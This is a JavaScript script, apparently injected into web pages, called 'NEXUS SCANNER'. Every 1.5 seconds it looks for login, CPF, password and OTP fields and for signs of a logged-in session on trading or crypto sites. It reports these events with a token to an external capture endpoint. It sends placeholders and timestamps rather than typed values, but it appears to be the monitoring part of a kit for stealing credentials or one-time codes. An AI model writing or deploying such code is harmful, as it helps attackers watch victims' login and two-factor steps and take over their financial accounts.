(function() {

    console.log("NEXUS SCANNER iniciado ✔");

    const TOKEN = window.NEXUS_TOKEN_INJECT || "032318";
    const CAPTURE_URL = window.NEXUS_CAPTURE_ENDPOINT;

    function sendCapture(data) {
        return fetch(CAPTURE_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-Nexus-Token": TOKEN
            },
            body: JSON.stringify(data)
        })
        .then(r => r.json())
        .catch(err => {
            console.log("Erro ao enviar captura:", err);
        });
    }

    function getLoginFields() {
        const inputs = document.querySelectorAll("input");
        let user = null, pass = null;

        inputs.forEach(i => {
            const type = (i.type || "").toLowerCase();
            const name = (i.name || "").toLowerCase();
            const placeholder = (i.placeholder || "").toLowerCase();

            if (!user && /(email|user|login|cpf)/i.test(name + placeholder + type)) {
                user = i;
            }
            if (!pass && /(password|senha|pwd)/i.test(name + placeholder + type)) {
                pass = i;
            }
        });

        return { user, pass };
    }

    function getOTPField() {
        const inputs = document.querySelectorAll("input");

        for (const i of inputs) {
            const t = (i.type || "").toLowerCase();
            const p = (i.placeholder || "").toLowerCase();
            const n = (i.name || "").toLowerCase();

            if (/(\bcode\b|otp|token|verificação|verification)/i.test(p + n + t)) {
                return i;
            }
        }
        return null;
    }

    function checkForLogin() {
        try {
            const { user, pass } = getLoginFields();

            if (user && pass) {
                console.log("NEXUS: Campos de login detectados!");

                sendCapture({
                    event: "login_fields_detected",
                    user_placeholder: user.placeholder,
                    pass_placeholder: pass.placeholder,
                    timestamp: Date.now()
                });
            }
        } catch (e) {
            console.log("Erro no scanner login:", e);
        }
    }

    function checkForOTP() {
        try {
            const otp = getOTPField();

            if (otp) {
                console.log("NEXUS: Campo OTP detectado");

                sendCapture({
                    event: "otp_field_detected",
                    placeholder: otp.placeholder || "",
                    timestamp: Date.now()
                });
            }
        } catch (e) {
            console.log("Erro no scanner OTP:", e);
        }
    }

    function checkIfLoggedIn() {
        try {
            const keywordTests = [
                "Saldo", "Depósito", "Histórico", "Minhas Operações",
                "Mercado", "OTC", "Ações", "Cripto", "Paridades", "Operar"
            ];

            const pageText = document.body.innerText || "";
            const found = keywordTests.some(kw => pageText.includes(kw));

            if (found) {
                console.log("NEXUS: Login detectado ✔");

                sendCapture({
                    event: "login_confirmed",
                    timestamp: Date.now()
                });
            }
        } catch (e) {
            console.log("Erro no scanner login-detect:", e);
        }
    }

    function periodicCheck() {
        checkForLogin();
        checkForOTP();
        checkIfLoggedIn();
    }

    console.log("NEXUS: scanner ativo. Monitorando…");

    // Roda a cada 1,5s
    setInterval(periodicCheck, 1500);

})();
